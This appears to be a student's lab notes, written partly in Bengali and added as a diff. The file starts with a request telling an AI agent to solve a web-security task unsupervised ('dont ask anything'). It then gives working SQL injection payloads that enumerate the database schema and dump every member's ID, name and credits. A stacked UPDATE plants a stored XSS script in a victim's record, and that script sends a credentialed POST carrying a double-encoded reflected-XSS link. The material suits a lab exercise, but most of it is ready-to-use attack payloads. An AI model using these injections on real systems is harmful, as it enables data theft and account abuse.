@@ -1,0 +1,104 @@
+❯ the way i have solve for A1, C1, can you do for B1? you are given all permission, dont ask anything. create two files, one
+  draft1.txt, initial before execurting, keep as variable the prameter name, write each query and steps i need to do. provide it
+  to me first. then you yourself execute everything and provide another draft2.txt that has the final solution , that i can
+  follow to reproduce everything, at the end, reset so that i can reproduce. give title for each task (like task1, task 2,...)
+please dont ask me anything, you are given all
+  permission, just provide me the two txt files
+
+
+attacker : 7700001 fit-nabila-17
+victim : 7700002 fit-rafi-17
+
+
+1.
+Demonstrate SQL injection and extract every memb er's ID,
+name, and remaining class credits through the attacker 
+submission channel.
+
+
+fit-nabila-17' AND '1' = '1
+fit-nabila-17' AND '1' = '0
+
+
+fit-nabila-17' order by 1 limit 1 -- -
+1 , 2, ... check. 6 e paina kichu.
+//5 ta colm
+
+' union select 1,2,3,4, 5 -- -
+//3,4,5 dekhay
+
+DB _name : b1_gym
+' union select 1,2,DATABASE(),'',5 -- -
+
+shob table dekhte :
+' union select 1,2,GROUP_CONCAT(table_name),'',5 from information_schema.tables where table_schema = DATABASE() -- -
+tables : log,membership
+
+column name :
+' union select 1,2,GROUP_CONCAT(column_name),'',5 from information_schema.columns where table_name = 'log' -- -
+log table colm : id,submitted_id,submitted_secret,attempted_at
+membership : id,access_code,first_name,last_name,credits_remaining
+
+
+' union select 1,'',GROUP_CONCAT(id,', ',first_name,' ',last_name,' : $',credits_remaining SEPARATOR '<br>'),'',5 FROM membership -- -
+
+
+
+
+
+2. Use a stacked statement issued as member 7700001 to persist 
+the first browser payload in member 7700002's record. 
+The attacker's own record must remain unchanged.
+
+
+Task 2-এর তিনটা জিনিস verify করবে:
+
+7700001 দিয়ে injection submit হয়েছে
+7700002-এর record-এ first browser payload save হয়েছে → এটাই “persistent”
+7700001-এর নিজের record unchanged আছে
+
+
+fit-nabila-17'; UPDATE membership SET last_name='' WHERE id=7700002; -- -
+
+browsing tab er title change korte :
+<script>document.title="B1-REFLECTED-XSS";</script>
+encode : %3Cscript%3Edocument.title%3D%22B1-REFLECTED-XSS%22%3B%3C%2Fscript%3E
+
+
+যদি /search page q-এর value-টা unsafe ভাবে HTML হিসেবে reflect করে, তাহলে page load হওয়ার সময় script execute হয়ে browser tab-এর title B1-REFLECTED-XSS হবে।
+"http://localhost:5001/search?q=<script>document.title="B1-REFLECTED-XSS";</script>"
+encode stage 1 : "http://localhost:5001/search?q=%3Cscript%3Edocument.title%3D%22B1-REFLECTED-XSS%22%3B%3C%2Fscript%3E"
+encode stage 2 : "http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253B%253C%252Fscript%253E"
+
+
+Stage-1 payload text (what gets stored in victim's last_name, executes in victim's browser):
+<script>fetch("http://localhost:5001/reply", {
+    "credentials":"include",
+    "headers":{
+        "Content-Type":"application/x-www-form-urlencoded"
+    }, 
+    "body":"message=http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253B%253C%252Fscript%253E", 
+    "method":"POST"
+});</script>
+
+Injection submitted via access_code (as id=7700001):
+fit-nabila-17'; UPDATE membership SET last_name = '
+<script>fetch("http://localhost:5001/reply", {
+    "credentials":"include",
+    "headers":{
+        "Content-Type":"application/x-www-form-urlencoded"
+    }, 
+    "body":"message=http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253B%253C%252Fscript%253E", 
+    "method":"POST"
+});</script>' WHERE id=7700002; -- -
+
+
+
+"http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3Dsigh" 
+
+Verify:
+' union select 1,2,last_name,4,5 from membership where id=7700002 -- -   -> shows the stored <script> tag
+
+fit-nabila-17' AND '1' = '1   (submitted as id=7700001)                  -> attacker's own row still "Nabila Chowdhury" (unchanged)
+
+
